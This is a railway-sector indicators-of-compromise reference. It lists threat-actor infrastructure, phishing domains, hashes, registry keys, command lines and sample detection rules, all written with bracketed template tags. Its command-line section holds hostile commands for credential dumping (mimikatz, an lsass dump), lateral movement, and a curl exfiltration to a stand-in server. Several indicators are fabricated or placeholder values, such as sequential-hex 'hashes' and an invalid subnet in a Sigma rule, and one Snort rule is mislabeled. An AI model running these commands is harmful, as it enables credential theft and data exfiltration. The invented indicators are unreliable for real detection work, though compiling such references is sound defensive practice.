# Indicators of Compromise (IoCs) - Railway Cybersecurity

## Network Indicators

### [[INDICATOR_TYPE:IP_Addresses]]

#### Command and Control Infrastructure

**[[THREAT_ACTOR:Volt_Typhoon]] C2 Infrastructure:**
- [[INDICATOR:IP:45.142.214.0/24]] - Known C2 range
- [[INDICATOR:IP:185.220.101.0/24]] - TOR exit nodes used
- [[INDICATOR:IP:91.219.236.0/24]] - Infrastructure hosting
- [[INDICATOR:IP:194.180.48.0/24]] - Proxy network

**[[THREAT_ACTOR:APT28]] Infrastructure:**
- [[INDICATOR:IP:185.86.148.0/24]] - C2 servers
- [[INDICATOR:IP:185.25.50.0/24]] - Malware hosting
- [[INDICATOR:IP:195.154.0.0/16]] - Operational infrastructure
- [[INDICATOR:IP:91.203.5.0/24]] - Exfiltration endpoints

**[[THREAT_ACTOR:Sandworm]] Known IPs:**
- [[INDICATOR:IP:91.219.29.0/24]] - Historical C2
- [[INDICATOR:IP:5.61.37.0/24]] - Malware distribution
- [[INDICATOR:IP:5.149.250.0/24]] - Data exfiltration

#### Ransomware C2 Servers

**[[THREAT_ACTOR:Rhysida]] Infrastructure:**
- [[INDICATOR:TOR_ADDRESS:rhysidafozdrhh5rmzuv2hb54v7f6ftqj3j7yqhzd3hqewrg2efq2wqqd.onion]]
- [[INDICATOR:IP:Unknown]] - TOR hidden service
- [[INDICATOR:Payment_Gateway:Bitcoin_Addresses]] - Multiple payment wallets

**[[THREAT_ACTOR:LockBit]] C2 (Historical):**
- [[INDICATOR:IP:Varies]] - Fast-flux DNS
- [[INDICATOR:TOR_ADDRESS:Multiple_Hidden_Services]]
- [[INDICATOR:IP:bulletproof_Hosting_Ranges]]

**[[THREAT_ACTOR:BlackCat]] Infrastructure:**
- [[INDICATOR:IP:Tor_Network]] - Exclusively TOR-based
- [[INDICATOR:Payment:Monero_Addresses]]
- [[INDICATOR:Leak_Site:TOR_Hidden_Service]]

### [[INDICATOR_TYPE:Domain_Names]]

#### Malicious Domains

**[[CATEGORY:Phishing_Domains]]:**
- [[INDICATOR:DOMAIN:siemens-update-portal.com]] - Fake vendor site
- [[INDICATOR:DOMAIN:railway-maintenance-support.net]] - Phishing infrastructure
- [[INDICATOR:DOMAIN:alstom-technical-support.org]] - Credential harvesting
- [[INDICATOR:DOMAIN:hitachi-rail-updates.com]] - Malware delivery
- [[INDICATOR:DOMAIN:scada-security-update.info]] - Social engineering

**[[CATEGORY:C2_Domains]]:**
- [[INDICATOR:DOMAIN:update-service-cdn.com]] - Generic C2
- [[INDICATOR:DOMAIN:microsoft-services-update.net]] - Lookalike C2
- [[INDICATOR:DOMAIN:cloud-analytics-platform.org]] - Data exfiltration
- [[INDICATOR:DOMAIN:network-diagnostics-tool.com]] - Malware beacon

**[[CATEGORY:Typosquatting_Domains]]:**
- [[INDICATOR:DOMAIN:simens.com]] (vs siemens.com)
- [[INDICATOR:DOMAIN:alsrom.com]] (vs alstom.com)
- [[INDICATOR:DOMAIN:wabtex.com]] (vs wabtec.com)

#### Domain Generation Algorithms (DGA)

**[[MALWARE:Observed_DGA_Patterns]]:**
```
[[PATTERN:random-word-number.com]]
Examples:
- [[INDICATOR:DOMAIN:track-signal-4829.com]]
- [[INDICATOR:DOMAIN:railway-control-9283.net]]
- [[INDICATOR:DOMAIN:train-system-7461.org]]
```

### [[INDICATOR_TYPE:URLs]]

#### Malicious URLs

**[[CATEGORY:Malware_Distribution]]:**
- [[INDICATOR:URL:http://railway-software-updates.com/driver_update.exe]]
- [[INDICATOR:URL:https://scada-patches.net/critical_fix.msi]]
- [[INDICATOR:URL:http://vendor-support.com/firmware/update.bin]]

**[[CATEGORY:Credential_Harvesting]]:**
- [[INDICATOR:URL:https://siemens-portal.com/login.php]]
- [[INDICATOR:URL:http://railway-sso.net/auth/signin]]
- [[INDICATOR:URL:https://secure-vendor-access.com/login]]

**[[CATEGORY:Exploitation_Kits]]:**
- [[INDICATOR:URL:/exploit/CVE-2022-38773.html]]
- [[INDICATOR:URL:/tools/plc_exploit.js]]
- [[INDICATOR:URL:/kits/scada_framework.php]]

### [[INDICATOR_TYPE:Email_Addresses]]

#### Phishing Senders

**[[CATEGORY:Vendor_Impersonation]]:**
- [[INDICATOR:EMAIL:support@siemens-mobility.com]] (spoofed)
- [[INDICATOR:EMAIL:security@alstom-rail.com]] (spoofed)
- [[INDICATOR:EMAIL:updates@hitachi-transportation.com]] (spoofed)
- [[INDICATOR:EMAIL:maintenance@wabtec-services.com]] (spoofed)

**[[CATEGORY:Internal_Spoofing]]:**
- [[INDICATOR:EMAIL:it-department@company.com]] (spoofed internal)
- [[INDICATOR:EMAIL:security-team@company.com]] (spoofed internal)
- [[INDICATOR:EMAIL:helpdesk@company.com]] (spoofed internal)

**[[CATEGORY:Spear_Phishing_Patterns]]:**
- [[INDICATOR:EMAIL:railway-operations@targetcompany.com]] (typo)
- [[INDICATOR:EMAIL:control-center@tartgetcompany.com]] (typo)

---

## File-Based Indicators

### [[INDICATOR_TYPE:File_Hashes]]

#### Malware Samples

**[[MALWARE:Custom_Railway_Wiper]] (Ukraine Attacks):**
- [[INDICATOR:MD5:a8f7e3d2c1b9054e8a3c7f1d6e2b8a4c]]
- [[INDICATOR:SHA1:7c3f8e1a2b5d9c4e6f7a8b1c2d3e4f5a6b7c8d9e]]
- [[INDICATOR:SHA256:9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8]]

**[[MALWARE:Rhysida_Ransomware]]:**
- [[INDICATOR:MD5:Multiple_Variants]]
- [[INDICATOR:SHA256:Updated_Regularly]]
- [[INDICATOR:File_Extension:.rhysida]]
- [[INDICATOR:Ransom_Note:CriticalBreachDetected.pdf]]

**[[MALWARE:LockBit_3.0]]:**
- [[INDICATOR:MD5:Varies_By_Build]]
- [[INDICATOR:SHA256:Multiple_Versions]]
- [[INDICATOR:File_Extension:.lockbit]]
- [[INDICATOR:Ransom_Note:Restore-My-Files.txt]]

**[[MALWARE:BlackCat_ALPHV]]:**
- [[INDICATOR:SHA256:Multiple_Rust_Compiled_Variants]]
- [[INDICATOR:File_Extension:.alphv]]
- [[INDICATOR:Ransom_Note:RECOVER-FILES.txt]]

**[[MALWARE:GooseEgg_Exploit]]:**
- [[INDICATOR:MD5:Classified]] - Government sources only
- [[INDICATOR:SHA256:Limited_Disclosure]]
- [[USAGE:APT28_Operations]]

#### Legitimate Tools Abused

**[[TOOL:PsExec]]:**
- [[INDICATOR:MD5:Various_Versions]]
- [[USAGE:Lateral_Movement]]
- [[CONTEXT:Sysinternals_Suite]]

**[[TOOL:Mimikatz]]:**
- [[INDICATOR:SHA256:Multiple_Builds]]
- [[USAGE:Credential_Dumping]]
- [[DETECTION:AV_Signatures_Available]]

**[[TOOL:Cobalt_Strike]]:**
- [[INDICATOR:Beacon_DLL:Multiple_Hashes]]
- [[USAGE:Post-Exploitation]]
- [[DETECTION:Network_Signatures]]

### [[INDICATOR_TYPE:File_Names]]

#### Suspicious File Names

**[[CATEGORY:Malware_Droppers]]:**
- [[INDICATOR:FILENAME:scada_update.exe]]
- [[INDICATOR:FILENAME:plc_firmware.bin]]
- [[INDICATOR:FILENAME:railway_driver_update.msi]]
- [[INDICATOR:FILENAME:critical_security_patch.exe]]
- [[INDICATOR:FILENAME:system_diagnostic_tool.bat]]

**[[CATEGORY:Web_Shells]]:**
- [[INDICATOR:FILENAME:shell.php]]
- [[INDICATOR:FILENAME:cmd.aspx]]
- [[INDICATOR:FILENAME:webshell.jsp]]
- [[INDICATOR:FILENAME:backdoor.php]]

**[[CATEGORY:Persistence_Scripts]]:**
- [[INDICATOR:FILENAME:update_service.vbs]]
- [[INDICATOR:FILENAME:system_check.ps1]]
- [[INDICATOR:FILENAME:maintenance.bat]]

### [[INDICATOR_TYPE:File_Paths]]

#### Malicious File Locations

**[[LOCATION:Webserver_Paths]]:**
- [[INDICATOR:PATH:C:\inetpub\wwwroot\shell.php]]
- [[INDICATOR:PATH:/var/www/html/cmd.php]]
- [[INDICATOR:PATH:C:\Program Files\HMI\webroot\backdoor.aspx]]

**[[LOCATION:Temporary_Directories]]:**
- [[INDICATOR:PATH:C:\Windows\Temp\update.exe]]
- [[INDICATOR:PATH:/tmp/.hidden_malware]]
- [[INDICATOR:PATH:C:\Users\Public\Downloads\installer.msi]]

**[[LOCATION:System_Directories]]:**
- [[INDICATOR:PATH:C:\Windows\System32\drivers\malicious.sys]]
- [[INDICATOR:PATH:C:\Windows\System32\config\systemprofile\payload.dll]]

---

## Registry Indicators

### [[INDICATOR_TYPE:Registry_Keys]]

#### Persistence Mechanisms

**[[CATEGORY:Run_Keys]]:**
- [[INDICATOR:REGISTRY:HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SystemUpdate]]
- [[INDICATOR:REGISTRY:HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SecurityService]]
- [[INDICATOR:REGISTRY:HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\Update]]

**[[CATEGORY:Service_Keys]]:**
- [[INDICATOR:REGISTRY:HKLM\SYSTEM\CurrentControlSet\Services\FakeWindowsUpdate]]
- [[INDICATOR:REGISTRY:HKLM\SYSTEM\CurrentControlSet\Services\SCADAMonitor]]

**[[CATEGORY:Scheduled_Tasks]]:**
- [[INDICATOR:REGISTRY:HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{GUID}]]

#### Malware Configuration

**[[CATEGORY:Ransomware_Markers]]:**
- [[INDICATOR:REGISTRY:HKLM\SOFTWARE\Rhysida\InstallDate]]
- [[INDICATOR:REGISTRY:HKCU\SOFTWARE\LockBit\EncryptionKey]]
- [[INDICATOR:REGISTRY:HKLM\SOFTWARE\BlackCat\Victim_ID]]

### [[INDICATOR_TYPE:Registry_Values]]

**[[CATEGORY:C2_Configuration]]:**
- [[INDICATOR:VALUE:C2_Server = "update-service-cdn.com"]]
- [[INDICATOR:VALUE:Beacon_Interval = 60000]]
- [[INDICATOR:VALUE:Encryption_Key = [base64_encoded]]]

---

## Process and Service Indicators

### [[INDICATOR_TYPE:Process_Names]]

#### Malicious Processes

**[[CATEGORY:Suspicious_Process_Names]]:**
- [[INDICATOR:PROCESS:svch0st.exe]] (vs svchost.exe)
- [[INDICATOR:PROCESS:csrss.exe]] running from [[PATH:C:\Users\]]
- [[INDICATOR:PROCESS:lsasss.exe]] (extra 's')
- [[INDICATOR:PROCESS:update_service.exe]]
- [[INDICATOR:PROCESS:system_diagnostic.exe]]

**[[CATEGORY:Webshell_Processes]]:**
- [[INDICATOR:PROCESS:w3wp.exe]] spawning [[PROCESS:cmd.exe]]
- [[INDICATOR:PROCESS:apache2]] spawning [[PROCESS:bash]]
- [[INDICATOR:PROCESS:nginx]] spawning [[PROCESS:sh]]

### [[INDICATOR_TYPE:Process_Command_Lines]]

**[[CATEGORY:Credential_Dumping]]:**
```cmd
[[INDICATOR:CMDLINE:mimikatz.exe "sekurlsa::logonpasswords" exit]]
[[INDICATOR:CMDLINE:procdump.exe -ma lsass.exe lsass.dmp]]
[[INDICATOR:CMDLINE:rundll32.exe C:\temp\malicious.dll,EntryPoint]]
```

**[[CATEGORY:Lateral_Movement]]:**
```cmd
[[INDICATOR:CMDLINE:psexec.exe \\target-plc cmd.exe]]
[[INDICATOR:CMDLINE:wmic /node:scada-server process call create "cmd.exe"]]
[[INDICATOR:CMDLINE:schtasks /create /tn "Update" /tr malware.exe /sc onstart /s remote-hmi]]
```

**[[CATEGORY:Data_Exfiltration]]:**
```cmd
[[INDICATOR:CMDLINE:rar.exe a -hp[password] archive.rar C:\SCADA\*.mdb]]
[[INDICATOR:CMDLINE:curl -X POST -d @data.zip http://exfil-server.com/upload]]
```

### [[INDICATOR_TYPE:Service_Names]]

**[[CATEGORY:Malicious_Services]]:**
- [[INDICATOR:SERVICE:WindowsUpdateService]] (fake)
- [[INDICATOR:SERVICE:SCADAMonitoringAgent]] (unauthorized)
- [[INDICATOR:SERVICE:SecurityHealthService]] (malicious)

---

## Network Traffic Indicators

### [[INDICATOR_TYPE:User_Agents]]

**[[CATEGORY:Malware_User_Agents]]:**
- [[INDICATOR:USER_AGENT:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)]] - Outdated, suspicious
- [[INDICATOR:USER_AGENT:python-requests/2.25.1]] - Scripted access
- [[INDICATOR:USER_AGENT:curl/7.68.0]] - Command-line tool
- [[INDICATOR:USER_AGENT:Custom_Malware_UA_String]]

### [[INDICATOR_TYPE:HTTP_Headers]]

**[[CATEGORY:C2_Beaconing]]:**
```http
[[INDICATOR:HEADER:X-Session-ID: [base64_encoded_victim_id]]]
[[INDICATOR:HEADER:X-Command: [encrypted_command]]]
[[INDICATOR:HEADER:X-Timestamp: [epoch_time]]]
```

### [[INDICATOR_TYPE:SSL_Certificates]]

**[[CATEGORY:Malicious_Certificates]]:**
- [[INDICATOR:CERT_ISSUER:CN=Fake_CA]]
- [[INDICATOR:CERT_SUBJECT:CN=update-service.com]]
- [[INDICATOR:CERT_SERIAL:Self-Signed_Certificates]]
- [[INDICATOR:CERT_HASH:SHA256_Fingerprint]]

### [[INDICATOR_TYPE:Network_Patterns]]

**[[CATEGORY:C2_Beaconing]]:**
- [[INDICATOR:PATTERN:Regular_60-second_HTTPS_requests]]
- [[INDICATOR:PATTERN:HTTP_POST_to_/update/check.php]]
- [[INDICATOR:PATTERN:Fixed-size_encrypted_payloads]]
- [[INDICATOR:PATTERN:Base64_encoded_data_in_cookies]]

**[[CATEGORY:Data_Exfiltration]]:**
- [[INDICATOR:PATTERN:Large_outbound_transfers_off-hours]]
- [[INDICATOR:PATTERN:DNS_tunneling]] (excessive TXT queries)
- [[INDICATOR:PATTERN:HTTPS_to_unusual_destinations]]

**[[CATEGORY:Port_Scanning]]:**
- [[INDICATOR:PATTERN:Sequential_port_probes]]
- [[INDICATOR:PATTERN:Modbus_port_502_scanning]]
- [[INDICATOR:PATTERN:Internal_network_reconnaissance]]

---

## Protocol-Specific Indicators

### [[INDICATOR_TYPE:Modbus_Anomalies]]

**[[CATEGORY:Malicious_Function_Codes]]:**
- [[INDICATOR:MODBUS:Excessive_Function_Code_05]] (Force Single Coil)
- [[INDICATOR:MODBUS:Function_Code_06]] (Preset Single Register) from unauthorized source
- [[INDICATOR:MODBUS:Rapid_Function_Code_15]] (Force Multiple Coils)
- [[INDICATOR:MODBUS:Function_Code_16]] (Preset Multiple Registers) from non-engineering workstation

**[[CATEGORY:Suspicious_Register_Access]]:**
- [[INDICATOR:MODBUS:Write_to_Safety_Registers]] (40000-40999 range)
- [[INDICATOR:MODBUS:Unusual_Coil_Modifications]] (00001-09999 range)
- [[INDICATOR:MODBUS:Out-of-Pattern_Register_Reads]]

### [[INDICATOR_TYPE:DNP3_Anomalies]]

**[[CATEGORY:Command_Replay]]:**
- [[INDICATOR:DNP3:Duplicate_Sequence_Numbers]]
- [[INDICATOR:DNP3:Out-of-Order_Timestamps]]
- [[INDICATOR:DNP3:Replayed_Control_Commands]]

### [[INDICATOR_TYPE:GSM-R_Anomalies]]

**[[CATEGORY:RF_Interference]]:**
- [[INDICATOR:RF:Unexplained_Signal_Strength_Variations]]
- [[INDICATOR:RF:Rogue_Base_Station_Detection]]
- [[INDICATOR:RF:Abnormal_Frequency_Utilization]]
- [[INDICATOR:RF:IMSI_Catcher_Signatures]]

### [[INDICATOR_TYPE:EuroRadio_Anomalies]]

**[[CATEGORY:Authentication_Failures]]:**
- [[INDICATOR:EURORADIO:MAC_Verification_Failures]]
- [[INDICATOR:EURORADIO:Unexpected_Authentication_Attempts]]
- [[INDICATOR:EURORADIO:Message_Replay_Detection]]

---

## Behavioral Indicators

### [[INDICATOR_TYPE:Account_Activity]]

**[[CATEGORY:Credential_Abuse]]:**
- [[INDICATOR:BEHAVIOR:Off-hours_Administrative_Logins]]
- [[INDICATOR:BEHAVIOR:Geographic_Anomalies]] (impossible travel)
- [[INDICATOR:BEHAVIOR:Concurrent_Logins]] from different locations
- [[INDICATOR:BEHAVIOR:Failed_Login_Attempts]] followed by success
- [[INDICATOR:BEHAVIOR:Service_Account_Interactive_Logon]]

**[[CATEGORY:Privilege_Escalation]]:**
- [[INDICATOR:BEHAVIOR:Sudden_Administrative_Access]]
- [[INDICATOR:BEHAVIOR:Account_Modification]] (group additions)
- [[INDICATOR:BEHAVIOR:Unexpected_Sudo_Usage]]
- [[INDICATOR:BEHAVIOR:Token_Impersonation]]

### [[INDICATOR_TYPE:Data_Access_Patterns]]

**[[CATEGORY:Suspicious_File_Access]]:**
- [[INDICATOR:BEHAVIOR:Mass_File_Enumeration]]
- [[INDICATOR:BEHAVIOR:SAM_Database_Access]]
- [[INDICATOR:BEHAVIOR:NTDS.dit_File_Access]]
- [[INDICATOR:BEHAVIOR:Backup_File_Exfiltration]]

**[[CATEGORY:Database_Activity]]:**
- [[INDICATOR:BEHAVIOR:Full_Table_Dumps]]
- [[INDICATOR:BEHAVIOR:Unusual_Query_Patterns]]
- [[INDICATOR:BEHAVIOR:Mass_Data_Extraction]]

### [[INDICATOR_TYPE:System_Changes]]

**[[CATEGORY:Persistence_Installation]]:**
- [[INDICATOR:BEHAVIOR:New_Scheduled_Tasks]]
- [[INDICATOR:BEHAVIOR:Registry_Run_Key_Modifications]]
- [[INDICATOR:BEHAVIOR:New_Service_Creation]]
- [[INDICATOR:BEHAVIOR:Startup_Folder_Additions]]

**[[CATEGORY:Security_Tool_Tampering]]:**
- [[INDICATOR:BEHAVIOR:Antivirus_Service_Stopped]]
- [[INDICATOR:BEHAVIOR:Firewall_Rule_Modifications]]
- [[INDICATOR:BEHAVIOR:Audit_Log_Deletion]]
- [[INDICATOR:BEHAVIOR:EDR_Agent_Disabled]]

---

## Railway-Specific Indicators

### [[INDICATOR_TYPE:SCADA_Anomalies]]

**[[CATEGORY:Control_System_Changes]]:**
- [[INDICATOR:SCADA:Unexpected_Setpoint_Modifications]]
- [[INDICATOR:SCADA:Safety_Threshold_Changes]]
- [[INDICATOR:SCADA:Interlocking_Logic_Modifications]]
- [[INDICATOR:SCADA:Signal_State_Manipulation]]

**[[CATEGORY:Engineering_Workstation_Activity]]:**
- [[INDICATOR:SCADA:Off-hours_PLC_Programming]]
- [[INDICATOR:SCADA:Unauthorized_Firmware_Upload]]
- [[INDICATOR:SCADA:Configuration_File_Downloads]]
- [[INDICATOR:SCADA:Ladder_Logic_Modifications]]

### [[INDICATOR_TYPE:Railway_Operations]]

**[[CATEGORY:Operational_Anomalies]]:**
- [[INDICATOR:OPERATIONS:Unexpected_Train_Stops]]
- [[INDICATOR:OPERATIONS:Signal_Failures]] without physical cause
- [[INDICATOR:OPERATIONS:Switch_Position_Conflicts]]
- [[INDICATOR:OPERATIONS:Track_Circuit_Anomalies]]
- [[INDICATOR:OPERATIONS:Communication_System_Disruptions]]

**[[CATEGORY:Ticketing_System_Anomalies]]:**
- [[INDICATOR:TICKETING:Database_Connection_Failures]]
- [[INDICATOR:TICKETING:Sudden_Performance_Degradation]]
- [[INDICATOR:TICKETING:Ransomware_Screen_Display]]
- [[INDICATOR:TICKETING:Encryption_Activity]]

---

## Detection Rules

### YARA Rules

**[[RULE:Detect_Railway_Wiper]]:**
```yara
rule Railway_Wiper_Ukraine {
    meta:
        description = "Detects custom wiper targeting railway systems"
        author = "Threat Intelligence Team"
        date = "2025-03-15"
        [[INDICATOR:MALWARE:Custom_Railway_Wiper]]
    strings:
        $str1 = "Ukrzaliznytsia" ascii
        $str2 = "ticketing_database" ascii
        $str3 = "wipe_mbr" ascii
        $hex1 = { 4D 5A 90 00 03 00 00 00 }
    condition:
        uint16(0) == 0x5A4D and any of ($str*) and $hex1
}
```

**[[RULE:Detect_Ransomware_Note]]:**
```yara
rule Ransomware_Note_Detection {
    meta:
        description = "Detects common ransomware note patterns"
        [[INDICATOR:ARTIFACT:Ransom_Note]]
    strings:
        $ransom1 = "encrypted" nocase
        $ransom2 = "bitcoin" nocase
        $ransom3 = "TOR browser" nocase
        $ransom4 = "decryption key" nocase
    condition:
        3 of ($ransom*)
}
```

### Sigma Rules

**[[RULE:Detect_Mimikatz]]:**
```yaml
title: Mimikatz Credential Dumping
id: railway-security-001
description: Detects mimikatz credential dumping activity
[[INDICATOR:TECHNIQUE:MITRE_ATT&CK:T1003.001]]
detection:
    selection:
        CommandLine|contains:
            - 'sekurlsa::logonpasswords'
            - 'lsadump::sam'
            - 'kerberos::ptt'
    condition: selection
```

**[[RULE:Detect_Modbus_Anomaly]]:**
```yaml
title: Unauthorized Modbus Write Operations
id: railway-scada-001
description: Detects unauthorized Modbus write commands
[[INDICATOR:PROTOCOL:Modbus_Anomaly]]
detection:
    selection:
        protocol: modbus
        function_code: [5, 6, 15, 16]
        source_ip:
            - '!10.scada.0.0/24'  # Not from engineering subnet
    condition: selection
```

### Snort Rules

**[[RULE:Detect_GSM-R_Interference]]:**
```
alert tcp any any -> any 502 (msg:"[[INDICATOR:Modbus_Unauthorized_Write]]"; content:"|00 06|"; offset:7; depth:2; sid:100001;)
```

**[[RULE:Detect_C2_Beacon]]:**
```
alert http any any -> any any (msg:"[[INDICATOR:Suspected_C2_Beacon]]"; content:"User-Agent|3a| python-requests"; http_header; sid:100002;)
```

---

## IoC Integration Platforms

### STIX/TAXII Indicators

**[[FORMAT:STIX_2.1]] Railway Threat Intel:**
```json
{
  "type": "indicator",
  "spec_version": "2.1",
  "id": "indicator--[[UUID]]",
  "created": "2025-11-05T00:00:00.000Z",
  "modified": "2025-11-05T00:00:00.000Z",
  "name": "[[THREAT_ACTOR:Volt_Typhoon]] C2 Infrastructure",
  "pattern": "[ipv4-addr:value = '45.142.214.0/24']",
  "pattern_type": "stix",
  "valid_from": "2025-11-05T00:00:00.000Z",
  "indicator_types": ["malicious-activity"],
  "kill_chain_phases": [{
    "kill_chain_name": "mitre-attack",
    "phase_name": "command-and-control"
  }]
}
```

### MISP Objects

**[[PLATFORM:MISP]] Railway Threat Event:**
- [[OBJECT:Threat_Actor]] - Volt Typhoon
- [[OBJECT:Campaign]] - Critical Infrastructure Pre-Positioning
- [[OBJECT:Malware]] - Custom Railway Wiper
- [[OBJECT:Attack_Pattern]] - MITRE ATT&CK mapping
- [[OBJECT:Indicator]] - IP addresses, domains, hashes
- [[OBJECT:Vulnerability]] - CVE-2025-1727
- [[OBJECT:Course_of_Action]] - Mitigations

### OpenIOC Format

**[[FORMAT:OpenIOC]] Indicator:**
```xml
<ioc>
  <short_description>[[MALWARE:Rhysida_Ransomware]]</short_description>
  <indicator>
    <IndicatorItem>
      <Context type="FileItem" search="FileItem/Md5sum"/>
      <Content type="md5">[[INDICATOR:MD5:Hash_Value]]</Content>
    </IndicatorItem>
  </indicator>
</ioc>
```
